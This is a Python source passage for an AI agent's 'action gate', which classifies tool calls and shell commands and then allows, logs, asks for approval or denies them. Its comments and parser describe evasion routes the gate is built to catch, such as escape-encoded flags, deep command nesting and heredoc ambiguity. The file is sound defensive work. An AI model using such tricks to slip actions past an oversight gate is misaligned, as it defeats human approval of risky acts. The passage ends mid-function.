"""Action gate: classify a tool call, then decide allow, log, ask or deny.

Two pure steps and one loader:

    c = classify({"tool": "terminal", "args": {"command": "gh pr comment 3 --body hi"}})
    d = decide(c, policies)          # Decision(outcome="ask", reason=..., violations=[...])
    policies = load_policies(store_root)

`classify` looks only at the tool name and its arguments. It places the action on four axes
(reversibility, exposure, cost, third-party effect) and gives it a category. `decide` maps the
cell through the principal's policies (gates matrix, scopes, category overrides, rules,
reserved and denied actions, budget, posting checks) and an operator floor that the principal
policy cannot lower: an irreversible public act that touches a third party always asks.

Approvals (D-033, docs/GATE.md): `approval_binding` hashes the exact outbound text, target and
arguments of an outward act, so an edit voids an approval; `approvers_for` reads who may answer
from `policies/approvals.yaml`. Posts to public targets also pass `check_scrub`, which looks for
internal names, home paths, model ids and internal ids.

Nothing here names a principal. Every value that belongs to one person lives in their store
under `policies/`. Stdlib only; the YAML reader is a small subset parser (see `parse_yaml`).
"""
from __future__ import annotations

import bisect
import contextvars
import copy
import fnmatch
import functools
import hashlib
import itertools
import json
import os
import re
import shlex
from dataclasses import asdict, dataclass, field, replace
from pathlib import Path
from types import EllipsisType
from typing import Any, Callable, Iterable, Iterator, Mapping, TypeVar, cast
from urllib.parse import urlparse

REVERSIBILITY = ("reversible", "costly", "irreversible")
EXPOSURE = ("private", "internal", "public")
OUTCOMES = ("allow", "log", "ask", "deny")
# Policy files may use the words from gates.yaml (act, report) or the outcome names.
_OUTCOME_ALIASES = {"act": "allow", "allow": "allow", "report": "log", "log": "log",
                    "ask": "ask", "deny": "deny", "block": "deny"}

# category -> (reversibility, exposure, third_party). The table is the default cell for each
# kind of action; classify() may adjust exposure from the target, decide() from scopes.
CATEGORIES: dict[str, tuple[str, str, bool]] = {
    "read":              ("reversible", "private", False),
    "local_write":       ("reversible", "private", False),
    "shell":             ("reversible", "private", False),
    "code":              ("reversible", "private", False),
    "generate":          ("reversible", "private", False),
    "delegate":          ("reversible", "private", False),
    "web_read":          ("reversible", "private", False),
    "reaction":          ("reversible", "internal", False),
    "peer_message":      ("reversible", "internal", False),  # D-026: the receiving seat gates it, not the sender
    "schedule":          ("costly", "private", False),
    "credentials":       ("costly", "private", False),
    "browser":           ("costly", "internal", False),
    "remote_write":      ("costly", "internal", False),
    "vcs_push":          ("costly", "internal", False),
    "vcs_merge":         ("costly", "internal", False),
    "vcs_admin":         ("costly", "internal", False),
    "deploy_preview":    ("costly", "internal", False),
    "deploy_production": ("costly", "public", True),
    "github_post":       ("costly", "public", True),
    "github_close":      ("costly", "public", True),
    "history_rewrite":   ("irreversible", "private", False),
    "delete":            ("irreversible", "private", False),
    "force_push":        ("irreversible", "internal", False),
    "publish":           ("irreversible", "public", True),
    "web_post":          ("irreversible", "public", True),
    "message_send":      ("irreversible", "public", True),
    "email_send":        ("irreversible", "public", True),
    "social_post":       ("irreversible", "public", True),
    "payment":           ("irreversible", "public", True),
    "account":           ("irreversible", "public", True),
    "unknown":           ("costly", "private", False),
    # D-038: code the gate cannot see into (a script, an interpreter, a variable in program position, an
    # unknown program) asks; a write to the Exo store asks the principal every time and is never granted.
    "opaque_exec":       ("costly", "private", False),
    "store_write":       ("costly", "private", False),
}

# Categories no standing grant covers and only the principal answers (D-033 terms, every time).
PRINCIPAL_ONLY = ("store_write",)
NO_GRANT = ("credentials", "store_write")

# Categories whose outbound text is checked against the posting rules by default.
OUTBOUND = ("github_post", "message_send", "email_send", "social_post", "web_post", "publish")
# Categories the posting rules apply to unless the policy says otherwise (human-readable posts;
# raw API payloads of web_post are left out because a footer check on JSON is noise).
POSTING_DEFAULT = ("github_post", "message_send", "email_send", "social_post")
# The most posting violations a decision lists when other posts on the line add theirs (#396). The rest are counted.
_LISTED_VIOLATIONS = 20


class PolicyError(ValueError):
    pass


# --- data ----------------------------------------------------------------------------------

@dataclass
class Classification:
    category: str
    reversibility: str
    exposure: str
    third_party: bool
    cost: float | None = 0.0          # None = a spend of unknown size
    tool: str = ""
    summary: str = ""                 # one line, human readable
    target: str = ""                  # repo, host, chat target or path the action lands on
    link: str = ""                    # URL or path the principal can open
    text: str = ""                    # outbound body text, if any
    title: str = ""                   # outbound title, if any
    text_file: str = ""               # body read from a file (the caller may load it)
    command: str = ""                 # shell command text, if any
    signals: list[str] = field(default_factory=list)
    # The simple commands a compound line was built from (D-075). `decide` checks reserved and deny
    # entries against each of them, so a denied action cannot ride along with a more severe one.
    parts: list["Classification"] = field(default_factory=list, repr=False, compare=False)
    _command_views: list[str] = field(default_factory=list, repr=False, compare=False)
    # The source text of the one simple command this part stands for, with its redirections (#394): a rule that
    # would lower a compound line must match it too (_line_own_test). None where no such text exists (a part the
    # gate made up, an unread nest, a string literal in code), and then no such rule matches.
    own: str | None = field(default=None, repr=False, compare=False)
    # The own text of each command on this line that changes the shell for the commands after it (_sets_state): a
    # rule that would lower the line must match each of them too (#394). None stands for a function definition.
    setters: list[str | None] = field(default_factory=list, repr=False, compare=False)
    # A part that runs the stdin of its line, which a command around that line may give (_runs_stdin, _given_stdin).
    inherits: bool = field(default=False, repr=False, compare=False)
    # The signals this part carried before _combine gave it every part's (#396), so the posting checks can tell its
    # own unseen body from another post's. None for a part never combined: its signals are then its own.
    own_signals: list[str] | None = field(default=None, repr=False, compare=False)

    def as_dict(self) -> dict:
        """Ledger-safe view: no outbound text or command, only their digests and sizes."""
        d = asdict(self)
        d.pop("parts", None)
        d.pop("_command_views")
        d.pop("own")
        d.pop("setters")
        d.pop("inherits")
        d.pop("own_signals")
        for k in ("text", "title", "command"):
            v = d.pop(k)
            if v:
                d[k + "_sha256"] = hashlib.sha256(v.encode("utf-8")).hexdigest()
                d[k + "_chars"] = len(v)
        return d


@dataclass
class Decision:
    outcome: str
    reason: str
    rule: str = ""                    # which step produced the outcome
    violations: list[str] = field(default_factory=list)
    exposure: str = ""                # effective exposure after scopes
    third_party: bool = False
    # (category, target) of each part a reserved entry matched, once each (D-075). A standing grant for the
    # line's own category must not cover a reserved part outside it, so the targets stay as written here.
    reserved: list[tuple[str, str]] = field(default_factory=list)

    def as_dict(self) -> dict:
        """Ledger view: reserved targets with URL userinfo redacted."""
        d = asdict(self)
        d["reserved"] = list(dict.fromkeys((cat, redact_userinfo(t)) for cat, t in self.reserved))
        return d


# --- helpers -------------------------------------------------------------------------------

def _make(category: str, tool: str = "", **kw) -> Classification:
    rev, exp, third = CATEGORIES.get(category, CATEGORIES["unknown"])
    kw.setdefault("reversibility", rev)
    kw.setdefault("exposure", exp)
    kw.setdefault("third_party", third)
    if "own" not in kw:
        slot = _own_text.get()
        kw["own"] = slot[0] if slot else None
    return Classification(category=category, tool=tool, **kw)


# The text of the simple command being classified (#394), in a one-item list per line that classify_shell sets: every
# part made for that command carries it (Classification.own), the parts of a nested line their own command's text.
# _classify_shell fills the slot for each simple command and empties it for the rest. None outside a shell line.
_own_text: contextvars.ContextVar[list[str | None] | None] = contextvars.ContextVar("exo_gate_own_text", default=None)


class _StandIn(str):
    """An own text that stands for another (#394). No text of a line is one, so it is told apart by identity."""


# The own text that a stdin reader's parts carry while _once reads a text once for all the readers on a line (#394).
# Each reader then gets copies with its own text in its place (_restamp).
_READER = _StandIn("the reader's own text")


def _severity(c: Classification) -> tuple:
    return (REVERSIBILITY.index(c.reversibility), EXPOSURE.index(c.exposure), c.third_party,
            c.category not in ("shell", "read", "code", "unknown"))


def _most_severe(cs: Iterable[Classification]) -> Classification | None:
    cs = list(cs)
    return max(cs, key=_severity) if cs else None


_LOCAL_HOSTS = ("localhost", "127.0.0.1", "0.0.0.0", "::1", "[::1]")


_USERINFO = re.compile(r"(?<=://)[^/\s?#]+@")


def redact_userinfo(s: str) -> str:
    """``s`` with the user and password of any URL in it replaced by ``***``, for text that reaches the ledger."""
    return _USERINFO.sub("***@", s or "")


# The ssh options the gate read with their value before D-075 (ssh's own are _SSH_VALUE_OPTS). With any other
# option, the gate took the value for the host.
_SSH_VALUE_OPTS_READ = ("-i", "-p", "-l", "-o", "-F", "-J", "-L", "-R", "-D", "-W", "-b", "-c", "-E", "-m", "-O", "-Q",
                        "-S", "-w", "-e", "-I")
# mosh's options as mosh.pl gives them to Perl's Getopt::Long: each name (the negated forms of `!` options too)
# with its option and whether it takes a value. `client`, `server` and `ssh` name a command mosh runs.
_MOSH_OPTS: dict[str, tuple[str, bool]] = {
    **{n: (n, True) for n in ("client", "server", "ssh", "predict", "port", "p", "family", "bind-server",
                              "experimental-remote-ip")},
    **{n: (n, False) for n in ("a", "n", "4", "6", "local", "help", "version")},
    **{neg + n: (opt, False) for opt, names in (("predict-overwrite", ("predict-overwrite", "o")), ("ssh-pty", ("ssh-pty",)),
                                                ("init", ("init",)), ("fake-proxy", ("fake-proxy",)))
       for n in names for neg in ("", "no", "no-")},
}


def _mosh_args(rest: list[str]) -> tuple[list[str], list[tuple[str, str]], str]:
    """mosh's arguments as Getopt::Long reads them in its default mode: the host and command words, each
    option with its value, and the first word that names no single option ('' if none).

    An option starts with `--`, `-` or `+`, in any case, and may be a unique prefix of a name; its value follows
    `=` or is the next word, and options may follow the host. `--` ends the options. From a word that names no
    single option (mosh stops there) on, the words are read as the host and command, the word itself as well
    once a host is read."""
    words: list[str] = []
    opts: list[tuple[str, str]] = []
    i = 0
    while i < len(rest):
        w = rest[i]
        i += 1
        if w == "--":
            words += rest[i:]
            break
        m = re.match(r"(--|-|\+)(.*)", w, re.S)
        if not m or w == "-":
            words.append(w)
            continue
        name, val = m.group(2), None
        if (eq := name.find("=", 1)) > 0:
            name, val = name[:eq], name[eq + 1:]
        key = name.lower()
        hits = {_MOSH_OPTS[key]} if key in _MOSH_OPTS else {o for n, o in _MOSH_OPTS.items() if n.startswith(key)}
        opt, valued = next(iter(hits)) if len(hits) == 1 else ("", False)
        if valued and val is None and i < len(rest):
            val, i = rest[i], i + 1
        elif valued and val == "":
            opt = ""                  # `--server=` is an error; `--server ''` is not
        if not opt or (val is None) == valued:
            words += rest[i - 1 if words else i:]
            return words, opts, w
        opts.append((opt, val or ""))
    return words, opts, ""


def _ssh_host(dest: str) -> str:
    """The host an ssh destination names: `user@host`, `ssh://user@host:2222` and `[::1]:22` give the host alone."""
    if dest.startswith("ssh://"):
        dest = dest[len("ssh://"):].split("/", 1)[0]
    dest = dest.rpartition("@")[2]
    if dest.startswith("["):
        return dest[1:].partition("]")[0]
    return dest.rsplit(":", 1)[0] if dest.count(":") == 1 else dest


def _host_of(url: str) -> str:
    if "://" not in url:
        url = "http://" + url
    try:
        return (urlparse(url).hostname or "").lower()
    except ValueError:
        return ""


def _is_local_host(host: str) -> bool:
    return host in _LOCAL_HOSTS or host.endswith(".local") or host.endswith(".localhost") or host == ""


def _first(args: Mapping, keys: Iterable[str]) -> str:
    for k in keys:
        v = args.get(k)
        if isinstance(v, (str, int, float)) and str(v).strip():
            return str(v)
    return ""


_TEXT_KEYS = ("body", "text", "message", "content", "comment", "caption", "status", "markdown")
_TITLE_KEYS = ("title", "subject")
_TARGET_KEYS = ("url", "repo", "repository", "to", "recipient", "recipients", "target", "channel",
                "chat_id", "channel_id", "thread", "path", "file_path", "project")
_AMOUNT_KEYS = ("amount", "price", "total", "cost", "value")


# --- shell parsing (D-038) -----------------------------------------------------------------
#
# The shell classifier is an allowlist. A small lexer turns a command line into simple commands
# (words, redirections, heredocs) and records every command substitution it meets. Each simple
# command has one program position. A command is `allow` only when every program in it is a known
# program with no indirection. A program the gate cannot see (a variable, command output, a script
# file, an interpreter, a function, an unknown binary) is `opaque_exec`, which asks. Where the gate
# can see inside (a `bash -c` string, a heredoc fed to a shell, `python -c` code, a `$( )`) it
# classifies the inner text too, and the result keeps the stricter of the two.

_DEPTH = 4
# How many levels of $( ), <( ) and $(( )) one lexer reads inside one another (#334). Each $( ) is listed at every
# level above it and classified there again, so the work for a nest grows with its depth, and classify runs inside
# the gate hook. A deeper part is not read: _nest_end finds where it ends, and it stands as _TOO_DEEP, an unread
# part that asks, also in an exported value. No hand-written command comes near this.
_NEST = 16
_TOO_DEEP = "__exo_gate_nested_too_deep__"
_STAND_INS = re.compile(r"(?:__exo_gate_nested_too_deep__(?:\n|\Z))+")   # a run of stand-in lines (_classify_shell)
_WRITE_REDIRS = (">", ">>", ">|", "&>", "&>>", "<>", ">&")
_REDIR_OPS = ("&>>", "&>", "<<<", "<<-", "<<", "<>", ">>", ">|", ">&", "<&", ">", "<")
_CTRL_OPS = (";;&", ";;", ";&", "&&", "||", "|&", "|", "&", ";", "(", ")")
_ASSIGN = re.compile(r"[A-Za-z_]\w*(\[[^\]]*\])?\+?=.*", re.S)
# `name()` is looked for only where a word starts, so a long word is not rescanned from each character
_FUNC_NAMES = re.compile(r"\bfunction\s+([^\s(){};&|<>]+)|(?<![^\s(){};&|<>'\"])([^\s(){};&|<>'\"]+)\s*\(\s*\)")
_ANSI_C = re.compile(rb"\\(?:([abeEfnrtv\\'\"?])|([0-7]{1,3})|x\{([0-9A-Fa-f]*)\}?|x([0-9A-Fa-f]{1,2})"
                     rb"|u([0-9A-Fa-f]{1,4})|U([0-9A-Fa-f]{1,8})|c(\\\\?|.))", re.S)


def _ansi_c(raw: str) -> str:
    """The text bash 5.2 makes of a $'..' body in a UTF-8 locale (#167). Octal and \\x values keep their
    low 8 bits, an escape bash does not know keeps its backslash, and a NUL ends the text. A \\u or \\U
    value is written as bash's u32toutf8 writes it: UTF-8 of up to six bytes, surrogates included, and
    nothing at all from 0x80000000 on (so `--forc\\UFFFFFFFFe` is `--force`)."""

    def one(m: re.Match) -> bytes:
        char, octal, brace, hexa, u, big, ctl = m.groups()
        if char:
            return bytes([dict(zip(b"abeEfnrtv", b"\a\b\x1b\x1b\f\n\r\t\v")).get(char[0], char[0])])
        if u or big:
            v = int(u or big, 16)
            if v < 0x80 or v >= 0x80000000:
                return bytes([v]) if v < 0x80 else b""
            n = next(k for k, top in ((2, 0x800), (3, 0x10000), (4, 0x200000), (5, 0x4000000), (6, 0x80000000))
                     if v < top)
            lead = (0xFF00 >> n) & 0xFF | v >> 6 * (n - 1)
            return bytes([lead] + [v >> 6 * k & 0x3F | 0x80 for k in range(n - 2, -1, -1)])
        if ctl:                                # \c\\ takes the escaped backslash as its character
            return b"\x7f" if ctl == b"?" else bytes([ctl[0] & 0x1F])
        return bytes([(int(octal, 8) if octal else int(hexa or brace or b"0", 16)) & 0xFF])

    out = _ANSI_C.sub(one, raw.encode("utf-8", "surrogatepass")).split(b"\0", 1)[0]
    # Bytes that are not UTF-8 (\xff, \377) read as Latin-1 characters.
    return re.sub("[\udc80-\udcff]", lambda b: chr(ord(b.group()) - 0xDC00), out.decode("utf-8", "surrogateescape"))


@dataclass
class _Word:
    text: str = ""
    dynamic: bool = False      # holds $var, ${..}, $(..) or `..` outside single quotes
    quoted: bool = False
    glob: bool = False         # an unquoted * or ?, or a [ or { after the first character
    brace: bool = False        # an unquoted {
    started: bool = False
    raw: str = ""              # the source text of the word, quotes kept
    locale: bool = False       # holds $".." (bash may swap in a translation and expand it)
    redir_after: bool = False  # a redirection, heredoc or here-string follows it before the next word (#207)
    dollar_quote: bool = False  # holds $'..' or $".." (dash and ash keep the $ and the quotes' contents)
    exps: list = field(default_factory=list)  # (scan text, source, ${ frames) per ${..} and $((..)) bash expands
    fd: str = ""               # a redirection target: the descriptor number written before its operator (`3< f`)


@dataclass
class _Heredoc:
    delim: str
    strip: bool
    quoted: bool
    ambiguous: bool = False    # delimiter spelled with $'..' or $"..": bash and dash end the body on different lines
    body: str = ""
    fd: str = ""               # the descriptor number before `<<` (`3<<EOF`); "" or 0 is stdin (#208)
    cut: str = ""              # the delimiter as the levels around read it, when it holds a part not read (#334)


@dataclass
class _Cmd:
    words: list = field(default_factory=list)
    redirs: list = field(default_factory=list)       # (operator, _Word)
    heredocs: list = field(default_factory=list)     # _Heredoc
    herestrings: list = field(default_factory=list)  # _Word
    piped_in: bool = False
    operands: list = field(default_factory=list)     # _Word after an unquoted NAME=(..): more of its operands
    piped_group: bool = False    # piped from a compound (`( .. )`, `{ ..; }`, a loop), not from one simple command
    own: str | None = None       # its source text with its redirections, after leading reserved words (#394)
    pipe_src: Callable[[], str | None] | None = None   # piped from simple commands: the pipeline text up to it
    fed: bool = False            # its stdin comes from a compound around it or piped into it (_feed_compound)


class _Lexer:
    """Shell words, operators, redirections and heredocs. Never raises; odd input gives odd words."""

    def __init__(self, src: str, scan: bool = True, nest: int = 0):
        self.s = src
        self.i = 0
        self.subs: list[str] = []          # sources of $( ), ` ` and <( ) met at this level
        self.pending: list[_Heredoc] = []
        self.scan = scan                   # record _Word.exps, which only _parse's words are read for (_hidden_sets)
        self.covered = 0                   # the source before here lies in a ${..} already recorded
        self.nest = nest                   # $( ), <( ) and $(( )) levels open around here (_NEST)
        self.cuts: list[tuple[int, int, str]] = []   # (start, end, stand-in) of each part not read, in order
        self.marks: list[tuple[int, int]] = []        # the last run's token spans, one per token, with scan (#394)

    def _cut(self, w: _Word, a: int) -> None:
        """The $( ) or <( ) at s[a] lies past _NEST levels and is not read. The line lists _TOO_DEEP for it, and the
        sources of the levels around it hold a short stand-in, so its text is not read again. The word's text is
        what the lexer would give it. A here-doc from before it whose body lies inside gets its body, read as at the
        cap (a $( ) in it is not read either), and the stand-in ends that body with an empty one, so a level read
        again does not take the lines after the part for the body."""
        s = self.s
        b, read = _nest_end(s, a + 2, self.pending)
        for hd in read:
            if not hd.quoted:
                sub = _Lexer(hd.body, scan=False, nest=_NEST)
                sub._dquote(_Word(), until_end=True)
                self.subs += sub.subs
        ends = "".join("\n" + (hd.cut or hd.delim) for hd in read) + "\n" if read else ""
        self.cuts.append((a, b, s[a] + "(" + _TOO_DEEP + ends + ")"))
        self.subs.append(_TOO_DEEP)
        w.text += "<(..)" if s[a] in "<>" else "$(" + s[a + 2:max(a + 2, b - 1)] + ")"
        w.dynamic = w.started = True
        self.i = b

    def _source(self, a: int, b: int) -> str:
        """s[a:b], with each part not read (_cut, a here-doc body holding one) spelt as its stand-in."""
        if not self.cuts:
            return self.s[a:b]
        k = bisect.bisect_left(self.cuts, (a,))
        if k == len(self.cuts) or self.cuts[k][0] >= b:
            return self.s[a:b]
        out = []
        for x, y, stand_in in self.cuts[k:]:
            if x >= b:
                break
            out += [self.s[a:x], stand_in]
            a = max(a, min(y, b))
        return "".join(out) + self.s[a:b]

    def run(self, closer: bool = False) -> list:
        s, toks = self.s, []
        # where each token starts and ends in s, for a command's own text (#394); only _parse reads them
        marks: list[tuple[int, int]] | None = [] if self.scan else None
        state = {"w": _Word(), "delim": None}
        depth, start = 0, -1              # start: where the current word's source text begins
        w_at = hd_at = 0                  # where that word starts with its `<(`, and where a here-doc's `<<` does
        fd = ""                           # the fd number of the redirection whose target comes next (`3< f`)

        def flush():
            nonlocal start, fd
            w = state["w"]
            w.raw, start = s[start:self.i], -1
            if w.started:
                w.fd, fd = fd, ""
                if state["delim"] is not None:
                    hd = _Heredoc(w.text, state["delim"], w.quoted, w.dollar_quote)
                    hd.fd = w.fd
                    at = self.i - len(w.raw)
                    if bisect.bisect_left(self.cuts, (at,)) < len(self.cuts):     # it holds a part not read
                        spelt = self._source(at, self.i)   # as the levels around spell it, read as a lexer reads it
                        # from the first level, as the levels around read it ($(cat <<'E') is its text)
                        hd.cut = next((t[1].text for t in _Lexer(spelt, scan=False).run() if t[0] == "w"),
                                      spelt)                # its end line is spelt so too (_read_heredocs)
                    self.pending.append(hd)
                    toks.append(("hd", hd))
                    if marks is not None:
                        marks.append((hd_at, self.i))
                    state["delim"] = None
                else:
                    toks.append(("w", w))
                    if marks is not None:
                        marks.append((w_at, self.i))
            state["w"] = _Word()

        while self.i < len(s):
            w = state["w"]
            if start < 0:
                start = w_at = self.i
            ch, nxt = s[self.i], s[self.i + 1:self.i + 2]
            if ch in " \t\r":
                flush()
                self.i += 1
            elif ch == "\n":
                flush()
                toks.append(("op", ";"))
                if marks is not None:
                    marks.append((self.i, self.i + 1))
                self.i += 1
                self._read_heredocs()
            elif ch == "#" and not w.started:
                j = s.find("\n", self.i)
                self.i = len(s) if j < 0 else j
            elif ch == "\\":
                if nxt != "\n":
                    w.text += nxt
                    w.quoted = w.started = True
                self.i += 2
            elif ch == "'":
                j = s.find("'", self.i + 1)
                j = len(s) if j < 0 else j
                w.text += s[self.i + 1:j]
                w.quoted = w.started = True
                self.i = j + 1
            elif ch == '"':
                self.i += 1
                self._dquote(w)
            elif ch == "`":
                self._backtick(w)
            elif ch == "$":
                self._dollar(w)
            elif ch in "<>" and nxt == "(" and not w.started:
                self.i += 2
                start = self.i
                if self.nest >= _NEST:
                    self._cut(cast(_Word, w), start - 2)
                    continue
                self.nest += 1
                self.run(closer=True)
                self.nest -= 1
                self.subs.append(self._source(start, max(start, self.i - 1)))
                w.text += "<(..)"
                w.dynamic = w.started = True
            elif ch in "<>" or (ch == "&" and nxt == ">"):
                op_at = self.i
                if w.started and w.text.isdigit() and not w.quoted:
                    state["w"], start, fd = _Word(), -1, cast(_Word, w).text    # an fd number belongs to the operator
                    op_at = w_at
                else:
                    flush()
                op = next(o for o in _REDIR_OPS if s.startswith(o, self.i))
                self.i += len(op)
                if op in ("<<", "<<-"):
                    state["delim"], hd_at = op == "<<-", op_at
                else:
                    toks.append(("redir", op))
                    if marks is not None:
                        marks.append((op_at, self.i))
            elif ch in ";&|()":
                flush()
                if ch == ")" and closer and depth == 0:
                    self.i += 1
                    return toks
                op = next(o for o in _CTRL_OPS if s.startswith(o, self.i))
                depth += {"(": 1, ")": -1}.get(op, 0)
                toks.append(("op", op))
                if marks is not None:
                    marks.append((self.i, self.i + len(op)))
                self.i += len(op)
            else:
                if ch in "*?" or (ch in "[{" and w.started):
                    w.glob = True
                if ch == "{" and isinstance(w, _Word):
                    w.brace = True
                w.text += ch
                w.started = True
                self.i += 1
        flush()
        self.marks = marks or []
        return toks

    def _read_heredocs(self) -> None:
        while self.pending:
            hd = self.pending.pop(0)
            first = self.i
            self.i, last = _heredoc_body(self.s, self.i, hd)
            if not hd.quoted:
                sub = _Lexer(hd.body, scan=False, nest=self.nest)
                sub._dquote(_Word(), until_end=True)
                self.subs += sub.subs
                if sub.cuts:                   # the levels around hold a stand-in for the body, as for a cut
                    self.cuts.append((first, last, "$(" + _TOO_DEEP + ")\n"))
            if hd.cut and last < len(self.s):  # and its end line as they spell the delimiter, so the two still pair
                at = self.s.find(hd.delim, last)
                self.cuts.append((at, at + len(hd.delim), hd.cut))

    def _dquote(self, w: _Word, until_end: bool = False) -> None:
        s = self.s
        w.quoted = w.started = True
        while self.i < len(s):
            ch, nxt = s[self.i], s[self.i + 1:self.i + 2]
            if ch == '"' and not until_end:
                self.i += 1
                return
            if ch == "\\" and nxt and nxt in '$`"\\\n':
                if nxt != "\n":
                    w.text += nxt
                self.i += 2
            elif ch == "$":
                self._dollar(w, double=True)
            elif ch == "`":
                self._backtick(w)
            else:
                w.text += ch
                self.i += 1

    def _procsub(self, w: _Word) -> None:
        """<( ) or >( ) at i, as run() reads one at the start of a word (for the scans that read text again)."""
        if self.nest >= _NEST:
            self._cut(w, self.i)
            return
        self.i += 2
        start = self.i
        self.nest += 1
        self.run(closer=True)
        self.nest -= 1
        self.subs.append(self._source(start, max(start, self.i - 1)))
        w.text += "<(..)"
        w.dynamic = w.started = True

    def _backtick(self, w: _Word) -> None:
        s, j, out = self.s, self.i + 1, []
        while j < len(s) and s[j] != "`":
            if s[j] == "\\" and j + 1 < len(s):
                out.append(s[j + 1])
                j += 2
                continue
            out.append(s[j])
            j += 1
        inner = "".join(out)
        self.subs.append(inner)
        self.i = j + 1
        w.text += "`" + inner + "`"
        w.dynamic = w.started = True

    def _dollar(self, w: _Word, double: bool = False) -> None:
        s, i = self.s, self.i
        nxt = s[i + 1:i + 2]
        w.started = True
        if s.startswith("$((", i):
            depth, j = 0, i + 1
            while j < len(s):
                depth += {"(": 1, ")": -1}.get(s[j], 0)
                j += 1
                if depth == 0:
                    break
            body = s[i:j]
            if self.nest >= _NEST and (_SUBST.search(body, 3) or "`" in body):
                self.cuts.append((i + 3, max(i + 3, j - 2), "$(" + _TOO_DEEP + ")"))
                self.subs.append(_TOO_DEEP)
            elif self.nest < _NEST and ("$(" in body[3:] or "`" in body):
                sub = _Lexer(body[3:-2], scan=False, nest=self.nest + 1)
                sub._dquote(_Word(), until_end=True)
                self.subs += sub.subs
                self.cuts += [(x + i + 3, y + i + 3, stand_in) for x, y, stand_in in sub.cuts]
            if self.scan and i >= self.covered:
                w.exps.append((body, body, None))
            w.text += body
            w.dynamic = True
            self.i = j
        elif nxt == "(":
            if self.nest >= _NEST:
                self._cut(w, i)
                return
            self.i = i + 2
            start = self.i
            self.nest += 1
            toks = self.run(closer=True)
            self.nest -= 1
            inner = s[start:max(start, self.i - 1)]
            lit = _literal_heredoc(toks)
            if lit is not None:
                w.text += lit          # $(cat <<'EOF' ... EOF) is plain text
            else:
                self.subs.append(self._source(start, max(start, self.i - 1)))
                w.text += "$(" + inner + ")"
                w.dynamic = True
        elif nxt == "{":
            j = s.find("}", i)
            j = len(s) - 1 if j < 0 else j
            if self.scan and i >= self.covered:    # what bash reads: it may run past this first }
                vis, close, frames = _dollar_brace(s, i, double, self.nest)
                w.exps.append((vis, s[i:close + 1], {at - i: [end - i, None if up is None else up - i]
                                                     for at, (end, up) in frames.items()}))
                self.covered = close + 1
            w.text += s[i:j + 1]
            w.dynamic = True
            self.i = j + 1
        elif nxt == "'":                       # $'..' (ANSI-C quoting): decode the escapes
            j, out = i + 2, []
            while j < len(s) and s[j] != "'":
                step = 2 if s[j] == "\\" else 1
                out.append(s[j:j + step])
                j += step
            raw = "".join(out)
            try:
                w.text += _ansi_c(raw)
            except (UnicodeError, ValueError):
                w.text += raw
                w.dynamic = True
            w.quoted = w.dollar_quote = True
            self.i = j + 1
        elif nxt == '"' and not double:        # $".." (locale quoting): the string itself, without the $
            self.i = i + 2
            w.locale = w.locale or s[i + 2:i + 3] != '"'     # bash never translates an empty $""
            w.dollar_quote = True
            self._dquote(w)
        else:
            m = re.match(r"\$([A-Za-z_]\w*|[0-9@*#?$!-])", s[i:])
            if m:
                w.text += m.group(0)
                w.dynamic = True
                self.i = i + len(m.group(0))
            else:
                w.text += "$"
                self.i = i + 1


def _heredoc_body(s: str, i: int, hd: _Heredoc) -> tuple[int, int]:
    """Read the body of ``hd`` from s[i] on, as bash ends it: at a line that is its delimiter. Sets hd.body and
    returns where the lexer goes on and where the line that ended the body starts (len(s) when none did)."""
    lines: list[str] = []
    while i < len(s):
        j = s.find("\n", i)
        end = len(s) if j < 0 else j
        line, start = s[i:end], i
        i = len(s) if j < 0 else j + 1
        bare = line.lstrip("\t" if hd.strip else "").strip()
        if bare == hd.delim:
            # bash ends a heredoc only on the exact line (leading tabs dropped for <<-): `EOF `, ` EOF` or
            # `EOF` and a CR does not end it, so the body bash reads is not the one read here (#208).
            hd.ambiguous = hd.ambiguous or (line.lstrip("\t") if hd.strip else line) != hd.delim
            break
        if bare.startswith(hd.delim) and bare[len(hd.delim):].strip(" )") == "":
            i = start + line.index(")", line.index(hd.delim))     # `EOF)` closes a $( ) too
            break
        lines.append(line.lstrip("\t") if hd.strip else line)
    else:
        start = len(s)
    hd.body = "\n".join(lines)
    return i, start


# For _nest_end: runs of characters an unquoted word and double-quoted text take as they stand, a backquoted body, a
# variable reference, and the longest here-doc delimiter it keeps (a longer one ends no body, so the rest is unread).
_WORD_RUN = re.compile(r"[^ \t\r\n\\'\"`$<>&;|()#]+")
_DQ_RUN = re.compile(r"[^\"\\$`]+")
_BT_BODY = re.compile(r"(?:[^`\\]|\\.)*", re.S)
_ANSI_BODY = re.compile(r"(?:[^'\\]|\\.)*", re.S)
_VAR_REF = re.compile(r"\$(?:[A-Za-z_]\w*|[0-9@*#?$!-])")
_PARENS = re.compile(r"[()]")
_SUBST = re.compile(r"\$\((?!\()")          # a $( that is not $((
_DELIM_MAX = 1024


def _match_end(rx: re.Pattern[str], s: str, i: int) -> int:
    m = rx.match(s, i)
    return m.end() if m else i


class _Open:
    """For _nest_end: a part it is inside. A $( ) or <( ) holds commands, read as run() reads them, with the state
    of its current word (`text` collects it when it will be a here-doc delimiter). Double-quoted text belongs to the
    word of the part below it (`owner`)."""
    __slots__ = ("kind", "start", "owner", "depth", "delim", "started", "digits", "quoted", "dollar", "text", "size",
                 "over")

    def __init__(self, kind: str, start: int = 0, owner: _Open | None = None):
        self.kind, self.start, self.owner, self.depth = kind, start, owner, 0
        self.delim: bool | None = None           # a << before the word (True for <<-): it is a delimiter
        self.new_word()

    def new_word(self) -> None:
        self.started, self.digits, self.quoted, self.dollar, self.size, self.over = False, True, False, False, 0, False
        self.text: list[str] | None = [] if self.delim is not None else None

    def add(self, s: str, a: int, b: int, wrap: str = "") -> None:
        """Add s[a:b] to a delimiter's text, inside `wrap` (`$(` and `)`) when given, unless it grows past
        _DELIM_MAX."""
        if self.text is None or self.over:
            return
        size = self.size + max(0, min(b, len(s)) - a) + len(wrap)
        if size > _DELIM_MAX:
            self.over, self.text = True, []
        else:
            self.text.append(wrap[:2] + s[a:b] + wrap[2:])
            self.size = size


def _nest_end(s: str, i: int, pending: list[_Heredoc]) -> tuple[int, list[_Heredoc]]:
    """Where the $( ) or <( ) whose text starts at s[i] ends, as _Lexer.run ends it (#334): just past its closing `)`,
    or at the end of s when none closes it. The text is read as the lexer reads it (quotes, comments, backquotes, the
    $ forms, redirections and here-documents), but only to find that end: one pass, with a stack of the open parts in
    place of the lexer's recursion, and no here-doc body read again. ``pending`` is the lexer's list of here-docs
    waiting for a newline: a body read here leaves it, and a here-doc opened here whose body comes later joins it.
    Also returns the here-docs from before the cut whose body was read here."""
    n, before = len(s), {id(h) for h in pending}
    read: list[_Heredoc] = []
